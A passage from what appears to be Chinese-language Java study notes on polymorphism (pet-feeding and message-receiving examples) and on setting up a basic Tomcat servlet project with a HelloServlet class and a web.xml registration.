喂养的方法<br>主人会喂养很多宠物<br>假设现阶段只猫、狗、鸟、兔子<br>但是随着时间的推移，主人会去喂养新的宠物鸟、蛇等等</p></blockquote><p><strong>传统思路：</strong>用重载在master中分别对3只动物投食，需要分别写3个feed函数，方法名称相同，参数列表不同：</p><p><strong>step1：</strong>创建master主人类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Master</span> </span>&#123;</span><br><span class="line">    <span class="comment">//喂养的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(cat cat)</span></span>&#123;</span><br><span class="line">        cat.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(Dog dog)</span></span>&#123;</span><br><span class="line">        dog.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(bird bird)</span></span>&#123;</span><br><span class="line">        bird.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step2：</strong>创建cat，dog，bird类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cat</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;猫吃鱼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗吃骨头&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bird</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;鸟吃虫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step3：</strong>主函数中调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mastertest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建主人对象</span></span><br><span class="line">        Master master = <span class="keyword">new</span> Master();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养猫</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> cat());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养狗</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> Dog());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养鸟</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> bird());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>但是这样设计程序可以实现功能，但是实际上违背了开闭原则（OCP原则），当随着时间进行，当主人喂养别的动物时，就需要对Master类需要修改，即修改源码。</p></blockquote><h3 id="eg5-2-主人喂养宠物案例（使用多态）"><a href="#eg5-2-主人喂养宠物案例（使用多态）" class="headerlink" title="eg5-2.主人喂养宠物案例（使用多态）"></a>eg5-2.主人喂养宠物案例（使用多态）</h3><p><strong>step1：</strong>创建宠物类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="comment">//最大的宠物类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">pet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有的宠物都有吃的特性&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step2：</strong>动物们继承pet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将eg5-1中所有的宠物都继承pet类</span></span><br></pre></td></tr></table></figure><p><strong>step3：</strong>创建人类，定义投食方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Master</span> </span>&#123;</span><br><span class="line">    <span class="comment">//喂养的方法</span></span><br><span class="line"><span class="comment">//    public void feed(cat cat)&#123;</span></span><br><span class="line"><span class="comment">//        cat.eat();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public void feed(Dog dog)&#123;</span></span><br><span class="line"><span class="comment">//        dog.eat();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    public void feed(bird bird)&#123;</span></span><br><span class="line"><span class="comment">//        bird.eat();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(pet pet)</span></span>&#123;</span><br><span class="line">        pet.eat();<span class="comment">//这里调用父类的方法，从编译上没毛病，但是在主函数中调用运行时，由于多态，会变成具体实例，即cat.eat，或者dog.eat这样</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step4：</strong>主函数中调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mastertest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建主人对象</span></span><br><span class="line">        Master master = <span class="keyword">new</span> Master();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养猫</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> cat());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养狗</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> Dog());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养鸟</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> bird());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>step5：</strong>添加需求，主人需要喂养兔子</p><blockquote><p>如果此时添加了新需求，主人需要喂养兔子，只需要添加pet的子类rabbit，然后在主函数中调用master这个“喂养宠物”的行为即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.master;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mastertest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建主人对象</span></span><br><span class="line">        Master master = <span class="keyword">new</span> Master();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养猫</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> cat());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养狗</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> Dog());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//喂养鸟</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> bird());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//突然需要喂养兔子了</span></span><br><span class="line">        master.feed(<span class="keyword">new</span> rabbit());</span><br><span class="line">        <span class="comment">//这里本质上传过去的参数就形成 pet pet=new rabbit();编译时看左边，即pet中有eat方法即可，执行时落到具体子类实例</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就满足了<em>没有在原来的代码上修改，只是添加了新的需求</em></p><h3 id="两个案例对比"><a href="#两个案例对比" class="headerlink" title="两个案例对比"></a>两个案例对比</h3><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609111704579.png" alt="image-20210609111704579"></p><h3 id="练习eg5-3-模拟手机接收消息（需要体现多态）"><a href="#练习eg5-3-模拟手机接收消息（需要体现多态）" class="headerlink" title="练习eg5-3. 模拟手机接收消息（需要体现多态）"></a>练习eg5-3. 模拟手机接收消息（需要体现多态）</h3><blockquote><p>人类Person接收消息的方法receive ()<br>接受消息的类型有很多种QQ、WeiXin、Email等等<br>根据多态来模拟人类接收消息的场景(一定要体现多态)</p></blockquote><p>照葫芦画瓢</p><p><strong>step1</strong>：形成逻辑图，确定关系</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609120803621.png" alt="image-20210609120803621"></p><p><strong>step2：</strong>构建消息父类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.plaf.synth.SynthEditorPaneUI;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 收到消息的父类，可分化为qq，wechat和email三种接收消息的方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msg</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">text</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;所有的方式都能收到消息~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step3：</strong>创建消息子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * msg的子类，以qq方式收到消息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msg_qq</span> <span class="keyword">extends</span> <span class="title">msg</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">text</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收到一条QQ消息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * msg子类，以微信方式收到信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msg_wechat</span> <span class="keyword">extends</span> <span class="title">msg</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">text</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收到一条微信消息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * msg子类，以邮件方式收到消息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">msg_email</span> <span class="keyword">extends</span> <span class="title">msg</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">text</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收到一封email邮件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step4：</strong>构建人类，收消息方法（显示消息）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 创建人类，接收消息方法中显示消息信息</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class human &#123;</span><br><span class="line">    public void receive(msg msg)&#123;</span><br><span class="line">        msg.text();</span><br><span class="line">        &#x2F;&#x2F;这里调用父类msg的text方法，但是在具体运行时会落到具体的实例中</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step5：</strong>在主函数中调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xiaoyao.message;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 需求</span></span><br><span class="line"><span class="comment">人类Person接收消息的方法receive ()</span></span><br><span class="line"><span class="comment">接受消息的类型有很多种QQ、WeiXin、Email等等</span></span><br><span class="line"><span class="comment">根据多态来模拟人类接收消息的场景(一定要体现多态)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主函数中创建对象，指挥对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        human human = <span class="keyword">new</span> human();</span><br><span class="line">        human.receive(<span class="keyword">new</span> msg_qq());<span class="comment">//传入的是一个msg_qq对象</span></span><br><span class="line">        human.receive(<span class="keyword">new</span> msg_wechat());<span class="comment">//从微信收到一条消息</span></span><br><span class="line">        human.receive(<span class="keyword">new</span> msg_email());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="day3-基于Tomcat和servlet实现简单的web前后端交互"><a href="#day3-基于Tomcat和servlet实现简单的web前后端交互" class="headerlink" title="day3 基于Tomcat和servlet实现简单的web前后端交互"></a>day3 基于Tomcat和servlet实现简单的web前后端交互</h2><h3 id="关于web"><a href="#关于web" class="headerlink" title="关于web"></a>关于web</h3><p>本质上是把后端的数据<em>渲染</em>在客户端，前后端交互的过程称作web的<em>动态交互</em>.</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609143959985.png" alt="image-20210609143959985"></p><p>Tomcat支持jar包war包，而且免费</p><h3 id="基于servlet和tomcat的前后端交互"><a href="#基于servlet和tomcat的前后端交互" class="headerlink" title="基于servlet和tomcat的前后端交互"></a>基于servlet和tomcat的前后端交互</h3><h4 id="eg6-部署到web服务器上的一个小项目"><a href="#eg6-部署到web服务器上的一个小项目" class="headerlink" title="eg6. 部署到web服务器上的一个小项目"></a>eg6. 部署到web服务器上的一个小项目</h4><p><strong>step1：</strong>安装Tomcat，配置JAVA_HOME系统环境变量</p><p>安装Tomcat，先配置环境变量JAVA_HOME， 值为 jdk的路径（不包含bin，java安装时包含bin），因为tomcat是java编写的，需要java运行环境。启动Tomcat中startup.bat文件，如下图表示运行成功。Tomcat服务器默认端口8080。（一般一个服务对应一个端口）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609150836809.png" alt="image-20210609150836809"></p><p><strong>step2：</strong>IDEA中集成web工程</p><ol><li><p>新建一个普通的java工程</p></li><li><p>导入动态web工程依赖</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609152110181.png" alt="image-20210609152110181"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609152152547.png" alt="image-20210609152152547"></p><p>添加之后，这个普通的java工程就变成了动态的web工程，出现web文件夹</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609152254335.png" alt="image-20210609152254335"></p></li><li><p>通过IDEA集成Tomcat</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609152741546.png" alt="image-20210609152741546"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609153108025.png" alt="image-20210609153108025"></p></li><li><p>随便写点东西在index.jsp中后，运行项目</p></li></ol><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609153251051.png" alt="image-20210609153251051"></p><ol start="5"><li><p>在浏览器中打开地址<a href="http://localhost:8080/web/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E5%86%85%E5%AE%B9%E3%80%82%E6%B3%A8%E6%84%8F%E8%BF%99%E9%87%8Cweb%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%AF%B9%E5%BA%94%E7%AC%AC%E4%B8%89%E6%AD%A5%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%8F%B73%E5%90%8D%E7%A7%B0">http://localhost:8080/web/即可看到内容。注意这里web文件路径对应第三步中的序号3名称</a></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609153726929.png" alt="image-20210609153726929"></p></li></ol><h4 id="关于servlet"><a href="#关于servlet" class="headerlink" title="关于servlet"></a>关于servlet</h4><p>servlet是前后端交互最原生的<strong>规范</strong>（本身是一个<strong>接口</strong>，在java中接口就是规范）</p><p><strong>servlet可以接收客户端响应的数据（<em>请求对象</em>），也可以响应数据给客户端（<em>响应对象</em>）</strong></p><h4 id="eg7-一个简单的前后端交互案例"><a href="#eg7-一个简单的前后端交互案例" class="headerlink" title="eg7. 一个简单的前后端交互案例"></a>eg7. 一个简单的前后端交互案例</h4><p><strong>step0：</strong>在前面eg6新建动态web工程project且配置tomcat的前提下，进行下面操作</p><p><strong>step1：</strong>在项目中导入jar包（jar包资源长下图这样）</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609191824537.png" alt="jar包资源长这样"></p><p>​        导入IDEA中的project工程中的web目录下的lib（新建lib）中，然后右键servlet-api.jar导入add as jar</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609192057537.png" alt="image-20210609192057537"></p><p><strong>step2：</strong> 给tomcat也添加servlet依赖，下面是tomcat的视图</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210609192453406.png" alt="image-20210609192453406"></p><p><strong>step3：</strong>创建一个java class用于重写servlet API中的方法，即以servlet的jar包中的类为父类，写一个java后端子类，子类对父类的重写覆盖。其实这里就开始是后端的内容。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210610170749504.png" alt="image-20210610170749504"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.liloker.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时创建的类只是一个普通的类，想让其成为一个Servlet类就必须继承Servlet接口中的父类，继承后会继承父类中的所有东西</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//选择重载封装了http协议的方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> req 请求对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resp 响应对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException 使用斜杠星星自动生成的文档注释内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span>   <span class="comment">//override就是子类重写父类的标识</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">//        super.service(req, resp); 子类继承父类的操作</span></span><br><span class="line">        <span class="comment">//这两个对象的实例是由浏览器发起调用，然后由tomcat容器创建的实例，然后这边就可以接收前端的数据</span></span><br><span class="line">        System.out.println(<span class="string">&quot;这是后端内容&quot;</span>);</span><br><span class="line">        <span class="comment">//重写该方法的目的就是为了，在运行这个程序时可以获取其请求对象和响应对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>step4：</strong>将当前servlet资源在web.xml中做一个注册，让前端知道如何访问后端，即访问后端资源的名称，资源在后端中的全类名，资源在前端url中对应的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    web.xml是前端用于知道后端有哪些资源的注册文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        资源的别名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        这里的资源别名需要成对出现，即需要知道其全类名和路径--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        